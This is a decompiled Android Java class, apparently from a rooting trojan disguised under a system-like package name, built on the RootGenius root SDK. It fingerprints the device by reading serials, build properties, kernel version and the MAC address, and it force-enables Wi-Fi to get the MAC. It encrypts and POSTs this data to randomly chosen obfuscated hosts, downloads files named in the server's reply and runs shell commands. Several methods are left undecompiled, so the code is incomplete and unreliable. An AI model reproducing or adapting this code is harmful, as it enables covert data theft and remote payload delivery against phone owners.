package com.android.a;

import android.annotation.TargetApi;
import android.content.Context;
import android.graphics.Point;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.util.Xml;
import android.view.Display;
import android.view.WindowManager;
import com.shuame.rootgenius.sdk.JniRoot;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Properties;
import java.util.Random;
import java.util.Vector;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

@TargetApi(13)
/* loaded from: classes.dex */
public final class u extends Thread {
    private String h;
    private String i;
    public static Context a = null;
    private static final String c = t.a(C0000a.N);
    public static String b = null;
    private static boolean d = false;
    private static boolean e = false;
    private int f = -1;
    private String g = null;
    private String j = null;
    private String k = null;
    private Vector l = new Vector();
    private JniRoot.RootParam m = new JniRoot.RootParam();

    private u() {
        this.h = null;
        this.i = null;
        this.h = String.valueOf(a.getFilesDir().getAbsolutePath()) + File.separator;
        b = String.valueOf(this.h) + t.a(C0000a.cg) + File.separator;
        this.i = String.valueOf(this.h) + t.a(C0000a.cg) + File.separator + t.a(C0000a.cf) + File.separator;
        new File(this.i).mkdirs();
        new File(String.valueOf(b) + File.separator + t.a(C0000a.bZ) + File.separator).mkdirs();
        e.a(a, c, String.valueOf(b) + t.a(C0000a.bZ) + File.separator + c);
        e.a(a, t.a(C0000a.ch), String.valueOf(b) + t.a(C0000a.bZ) + File.separator + t.a(C0000a.ch));
        e.a(a, t.a(C0000a.cd), String.valueOf(b) + t.a(C0000a.bZ) + File.separator + t.a(C0000a.cd));
        e.a(a, t.a(C0000a.ck), String.valueOf(b) + t.a(C0000a.bZ) + File.separator + t.a(C0000a.ck));
        e.a(a, t.a(C0000a.cl), String.valueOf(b) + t.a(C0000a.bZ) + File.separator + t.a(C0000a.cl));
    }

    private String a(x xVar) throws InterruptedException, IOException {
        String str = String.valueOf(this.g) + xVar.a + t.a(C0000a.bW);
        String str2 = String.valueOf(this.i) + xVar.a + t.a(C0000a.bW);
        File file = new File(str2);
        if (file.exists() && file.length() > 0) {
            return str2;
        }
        C0001b c0001b = new C0001b(str, str2, new q());
        c0001b.d();
        if (!c0001b.a()) {
            c(String.valueOf(String.format(t.a(C0000a.bD), t.a(C0000a.bX))) + xVar.a + String.format(t.a(C0000a.bD), t.a(C0000a.bY)) + xVar.b);
            return null;
        }
        if (file.exists() && file.length() > 0) {
            return str2;
        }
        c(String.valueOf(String.format(t.a(C0000a.bD), t.a(C0000a.bX))) + xVar.a + String.format(t.a(C0000a.bD), t.a(C0000a.bY)) + xVar.b);
        return null;
    }

    private static String a(String str) throws InterruptedException, IOException {
        StringBuffer stringBuffer = new StringBuffer();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(t.a(C0000a.aC));
            processBuilder.redirectErrorStream(true);
            Process processStart = processBuilder.start();
            DataOutputStream dataOutputStream = new DataOutputStream(processStart.getOutputStream());
            DataInputStream dataInputStream = new DataInputStream(processStart.getInputStream());
            stringBuffer.setLength(0);
            dataOutputStream.writeBytes(String.format(t.a(C0000a.bL), str));
            dataOutputStream.flush();
            dataOutputStream.writeBytes(String.format(t.a(C0000a.bL), t.a(C0000a.aD)));
            dataOutputStream.flush();
            long jCurrentTimeMillis = System.currentTimeMillis() + 20000;
            while (true) {
                boolean z = dataInputStream.available() <= 0;
                String line = dataInputStream.readLine();
                if (line == null) {
                    z = true;
                }
                if (!z) {
                    if (line.contains(t.a(C0000a.aE))) {
                        break;
                    }
                    stringBuffer.append(t.a(C0000a.J));
                    stringBuffer.append(line);
                } else {
                    if (System.currentTimeMillis() > jCurrentTimeMillis) {
                        break;
                    }
                    Thread.sleep(500L);
                }
            }
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (InterruptedException e3) {
            e3.printStackTrace();
        }
        return stringBuffer.toString();
    }

    private static String a(byte[] bArr) {
        StringBuilder sb = new StringBuilder();
        for (byte b2 : bArr) {
            String hexString = Integer.toHexString(b2 & 255);
            if (hexString.length() == 1) {
                sb.append(String.valueOf(0));
            }
            sb.append(hexString);
        }
        return sb.toString();
    }

    public static void a(Context context) throws InterruptedException {
        a = context;
        e = false;
        d = false;
        new u().start();
        while (true) {
            try {
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
            if (e) {
                new d(context).start();
                return;
            }
            Thread.sleep(48L);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:109:0x00a3 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:110:0x008d A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x01fd A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:119:0x01e4 A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private static void a(java.lang.String r13, java.lang.String r14) throws java.io.IOException {
        /*
            Method dump skipped, instructions count: 648
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.a.u.a(java.lang.String, java.lang.String):void");
    }

    private int b() {
        try {
            return new File(t.a(C0000a.aF)).listFiles(new v(this, (byte) 0)).length;
        } catch (Exception e2) {
            return 1;
        }
    }

    private String b(Context context) throws IOException {
        int width;
        int height;
        try {
            StringBuilder sb = new StringBuilder();
            String strA = t.a(C0000a.aL);
            String strB = b(String.valueOf(strA) + t.a(C0000a.aM));
            String strB2 = b(String.valueOf(strA) + t.a(C0000a.aN));
            String strB3 = b(String.valueOf(strA) + t.a(C0000a.aO));
            String strReplaceAll = strB.replaceAll(t.a(C0000a.J), "");
            String strReplaceAll2 = strB2.replaceAll(t.a(C0000a.J), "");
            String strReplaceAll3 = strB3.replaceAll(t.a(C0000a.J), "");
            char[] cArr = new char[1024];
            FileReader fileReader = new FileReader(t.a(C0000a.aP));
            StringReader stringReader = new StringReader(String.valueOf(cArr, 0, fileReader.read(cArr)).replaceAll(t.a(C0000a.q), t.a(C0000a.r)));
            Properties properties = new Properties();
            properties.load(stringReader);
            fileReader.close();
            String property = properties.getProperty(t.a(C0000a.aQ), "");
            String property2 = properties.getProperty(t.a(C0000a.aR), "");
            String strValueOf = String.valueOf(b());
            String property3 = properties.getProperty(t.a(C0000a.aS), "");
            StringReader stringReader2 = new StringReader(a(t.a(C0000a.aT)).replaceAll(t.a(C0000a.s), ""));
            Properties properties2 = new Properties();
            properties2.load(stringReader2);
            String property4 = properties2.getProperty(t.a(C0000a.aU), "");
            String property5 = properties2.getProperty(t.a(C0000a.aV), "");
            String property6 = properties2.getProperty(t.a(C0000a.aW), "");
            String property7 = properties2.getProperty(t.a(C0000a.aX), "");
            String property8 = properties2.getProperty(t.a(C0000a.aY), "");
            String property9 = properties2.getProperty(t.a(C0000a.aZ), "");
            String property10 = properties2.getProperty(t.a(C0000a.ba), "");
            String property11 = properties2.getProperty(t.a(C0000a.bb), "");
            String property12 = properties2.getProperty(t.a(C0000a.bc), "");
            String property13 = properties2.getProperty(t.a(C0000a.bd), "");
            String property14 = property13.length() <= 0 ? properties2.getProperty(t.a(C0000a.be), "") : property13;
            String strValueOf2 = String.valueOf(cArr, 0, new FileReader(t.a(C0000a.bf)).read(cArr));
            Display defaultDisplay = ((WindowManager) a.getSystemService("window")).getDefaultDisplay();
            Point point = new Point();
            if (Build.VERSION.SDK_INT < 13) {
                width = defaultDisplay.getWidth();
                height = defaultDisplay.getHeight();
            } else {
                defaultDisplay.getSize(point);
                width = point.x;
                height = point.y;
            }
            String str = String.valueOf(width) + "x" + height;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(t.a(C0000a.bg));
            sb.append(t.a(C0000a.bh));
            String strA2 = t.a(C0000a.bi);
            String strA3 = t.a(C0000a.bj);
            String strA4 = t.a(C0000a.bD);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bk))) + "" + String.format(strA3, t.a(C0000a.bk)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bk))) + "");
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bl))) + strReplaceAll3 + String.format(strA3, t.a(C0000a.bl)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bl))) + strReplaceAll3);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bm))) + strReplaceAll2 + String.format(strA3, t.a(C0000a.bm)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bm))) + strReplaceAll2);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bn))) + "" + String.format(strA3, t.a(C0000a.bn)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bn))) + "");
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bo))) + strReplaceAll + String.format(strA3, t.a(C0000a.bo)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bo))) + strReplaceAll);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bp))) + strReplaceAll + String.format(strA3, t.a(C0000a.bp)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bp))) + strReplaceAll);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bq))) + property4 + String.format(strA3, t.a(C0000a.bq)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bq))) + property4);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.br))) + property5 + String.format(strA3, t.a(C0000a.br)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.br))) + property5);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bs))) + property6 + String.format(strA3, t.a(C0000a.bs)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bs))) + property6);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bt))) + property7 + String.format(strA3, t.a(C0000a.bt)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bt))) + property7);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bu))) + property8 + String.format(strA3, t.a(C0000a.bu)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bu))) + property8);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bv))) + property9 + String.format(strA3, t.a(C0000a.bv)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bv))) + property9);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bw))) + "" + String.format(strA3, t.a(C0000a.bw)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bw))) + "");
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bx))) + property10 + String.format(strA3, t.a(C0000a.bx)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bx))) + property10);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.by))) + property11 + String.format(strA3, t.a(C0000a.by)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.by))) + property11);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bz))) + property + String.format(strA3, t.a(C0000a.bz)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bz))) + property);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bA))) + strValueOf2 + String.format(strA3, t.a(C0000a.bA)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bA))) + strValueOf2);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bB))) + property14 + String.format(strA3, t.a(C0000a.bB)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bB))) + property14);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bC))) + property12 + String.format(strA4, t.a(C0000a.bC)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bC))) + property12);
            sb2.append(String.valueOf(t.a(C0000a.t)) + property2 + t.a(C0000a.u) + strValueOf + t.a(C0000a.v) + property + t.a(C0000a.w) + property3 + t.a(C0000a.x));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bE))) + property3);
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bF))) + property2);
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bG))) + strValueOf);
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bH))) + property);
            sb2.append(String.valueOf(String.format(strA2, t.a(C0000a.bI))) + str + String.format(strA3, t.a(C0000a.bI)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bI))) + str);
            sb2.append(String.format(strA3, t.a(C0000a.bJ)));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bK))) + a(JniRoot.encrypt(sb2.toString().getBytes())));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bM))) + c.a(context));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bN))) + e.b(a));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bO))) + e.b());
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bP))) + t.a(new byte[]{103, 111, 108, 47, 111, 113, 97, 121}));
            sb.append(String.valueOf(String.format(strA4, t.a(C0000a.bQ))) + t.a(new byte[]{49, 55, 50, 48, 60, 59, 63, 35, 48, 62, 57, 52, 54, 54, 54, 51, 56, 52, 48, 49, 32, 50, 56, 57, 48, 50, 49, 52, 51, 51, 55, 52}));
            sb.append(String.valueOf(String.format(strA4, n.i)) + t.b(a));
            this.m.androidSdkVer = Build.VERSION.SDK_INT;
            this.m.androidVer = property10;
            this.m.buildDescription = property12;
            this.m.coreVer = strValueOf2;
            this.m.macAddr = c();
            this.m.rootgeniusVer = 42;
            this.m.serial = strReplaceAll;
            this.m.tempRoot = 0;
            return sb.toString();
        } catch (FileNotFoundException e2) {
            e2.printStackTrace();
            return null;
        } catch (IOException e3) {
            e3.printStackTrace();
            return null;
        }
    }

    private static String b(String str) throws IOException {
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(str));
            byte[] bArr = new byte[1024];
            int i = fileInputStream.read(bArr);
            fileInputStream.close();
            return i <= 0 ? "" : new String(bArr, 0, i);
        } catch (FileNotFoundException e2) {
            e2.printStackTrace();
            return "";
        } catch (IOException e3) {
            e3.printStackTrace();
            return "";
        }
    }

    private static String c() {
        WifiManager wifiManager = (WifiManager) a.getSystemService("wifi");
        if (!t.h(a)) {
            try {
                wifiManager.setWifiEnabled(true);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return wifiManager.getConnectionInfo().getMacAddress();
    }

    private void c(String str) throws IOException {
        try {
            String str2 = String.valueOf(this.k) + str;
            String strE = e();
            byte[] bArrA = C0001b.a(str2.getBytes());
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(String.valueOf(t.a(C0000a.aG)) + strE + t.a(new byte[]{43, 111, 113, 111, 108, 122, 96, 58, 119, 123, 127, 119, 116})).openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setDoInput(true);
            httpURLConnection.setUseCaches(false);
            httpURLConnection.setConnectTimeout(120000);
            httpURLConnection.setReadTimeout(120000);
            httpURLConnection.setRequestMethod(t.a(C0000a.W));
            httpURLConnection.setRequestProperty(t.a(C0000a.Y), String.valueOf(bArrA.length));
            httpURLConnection.setRequestProperty(t.a(C0000a.Z), t.a(C0000a.aa));
            httpURLConnection.setRequestProperty(t.a(C0000a.ab), t.a(C0000a.ac));
            httpURLConnection.setRequestProperty(t.a(C0000a.ad), t.a(C0000a.ae));
            DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
            dataOutputStream.write(bArrA);
            dataOutputStream.flush();
            dataOutputStream.close();
            httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x015c A[Catch: Exception -> 0x017b, FileNotFoundException -> 0x0180, TRY_LEAVE, TryCatch #1 {Exception -> 0x017b, blocks: (B:12:0x004c, B:15:0x0071, B:17:0x0125, B:19:0x014d, B:23:0x015c, B:22:0x0158, B:21:0x0153), top: B:32:0x004c, outer: #0 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private void d() throws java.lang.InterruptedException, java.io.IOException {
        /*
            Method dump skipped, instructions count: 389
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.a.u.d():void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:57:?, code lost:
    
        return null;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r2v1 */
    /* JADX WARN: Type inference failed for: r2v4 */
    /* JADX WARN: Type inference failed for: r2v5, types: [java.lang.InterruptedException] */
    /* JADX WARN: Type inference failed for: r2v6 */
    /* JADX WARN: Type inference failed for: r2v7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private byte[] d(java.lang.String r10) throws java.lang.InterruptedException, java.io.IOException {
        /*
            Method dump skipped, instructions count: 370
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.a.u.d(java.lang.String):byte[]");
    }

    private static String e() {
        String[] strArr = {t.a(new byte[]{116, 104, 48, 47, 96, 110, 122, 108, 125, 120, 98, 102, 42, 103, 111, 108, 59, 61, 50, 49, 37}), t.a(new byte[]{116, 104, 51, 47, 96, 110, 122, 108, 125, 120, 98, 102, 42, 103, 111, 108, 59, 61, 50, 49, 37}), t.a(new byte[]{116, 104, 50, 47, 96, 110, 122, 108, 125, 120, 98, 102, 42, 103, 111, 108, 59, 61, 50, 49, 37}), t.a(new byte[]{116, 104, 53, 47, 96, 110, 122, 108, 125, 120, 98, 102, 42, 103, 111, 108, 59, 61, 50, 49, 37}), t.a(new byte[]{116, 104, 48, 47, 119, 119, 123, 124, 106, 110, 123, 96, 118, 42, 99, 110, 108, 63, 58, 57, 45, 55}), t.a(new byte[]{116, 104, 51, 47, 119, 119, 123, 124, 106, 110, 123, 96, 118, 42, 99, 110, 108, 63, 58, 57, 45, 55}), t.a(new byte[]{116, 104, 50, 47, 119, 119, 123, 124, 106, 110, 123, 96, 118, 42, 99, 110, 108, 63, 58, 57, 45, 55}), t.a(new byte[]{116, 104, 53, 47, 119, 119, 123, 124, 106, 110, 123, 96, 118, 42, 99, 110, 108, 63, 58, 57, 45, 55})};
        return strArr[Math.abs(new Random().nextInt()) % strArr.length];
    }

    private static byte[] e(String str) {
        int i = 0;
        byte[] bArr = new byte[str.length() / 2];
        int i2 = 0;
        while (i2 < str.length()) {
            bArr[i] = Integer.decode("0x" + str.substring(i2, i2 + 2)).byteValue();
            i2 += 2;
            i++;
        }
        return bArr;
    }

    private void f(String str) throws XmlPullParserException, IOException {
        try {
            StringReader stringReader = new StringReader(str);
            XmlPullParser xmlPullParserNewPullParser = Xml.newPullParser();
            this.l.clear();
            xmlPullParserNewPullParser.setInput(stringReader);
            x xVar = null;
            for (int eventType = xmlPullParserNewPullParser.getEventType(); eventType != 1; eventType = xmlPullParserNewPullParser.next()) {
                switch (eventType) {
                    case 2:
                        String name = xmlPullParserNewPullParser.getName();
                        if (name.equals(t.a(C0000a.bR))) {
                            xVar = new x(this);
                            break;
                        } else if (name.equals(t.a(C0000a.bk))) {
                            xmlPullParserNewPullParser.next();
                            this.j = xmlPullParserNewPullParser.getText();
                            break;
                        } else if (xVar == null) {
                            break;
                        } else if (name.equals(t.a(C0000a.bU))) {
                            xmlPullParserNewPullParser.next();
                            xVar.a = xmlPullParserNewPullParser.getText();
                            break;
                        } else if (name.equals(t.a(C0000a.bT))) {
                            xmlPullParserNewPullParser.next();
                            xVar.b = xmlPullParserNewPullParser.getText();
                            break;
                        } else if (name.equals(t.a(C0000a.bS))) {
                            xmlPullParserNewPullParser.next();
                            xmlPullParserNewPullParser.getText();
                            break;
                        } else if (name.equals(t.a(C0000a.bV))) {
                            xmlPullParserNewPullParser.next();
                            xmlPullParserNewPullParser.getText();
                            break;
                        } else if (name.equals(t.a(C0000a.bJ))) {
                            xmlPullParserNewPullParser.next();
                            xVar.c = xmlPullParserNewPullParser.getText();
                            break;
                        } else {
                            break;
                        }
                    case 3:
                        if (xmlPullParserNewPullParser.getName().equals(t.a(C0000a.bR))) {
                            this.l.addElement(xVar);
                            xVar = null;
                            break;
                        } else {
                            break;
                        }
                }
            }
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (XmlPullParserException e3) {
            e3.printStackTrace();
        }
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        String str;
        try {
            String strB = b(a);
            this.k = strB;
            byte[] bArrD = d(strB);
            if (this.f == 0) {
                str = new String(JniRoot.decrypt(C0001b.b(bArrD)));
            } else if (1 != this.f) {
                return;
            } else {
                str = new String(C0001b.b(bArrD));
            }
            f(str);
            d();
        } catch (Exception e2) {
            e2.printStackTrace();
            e.a(a, e2);
        }
    }
}
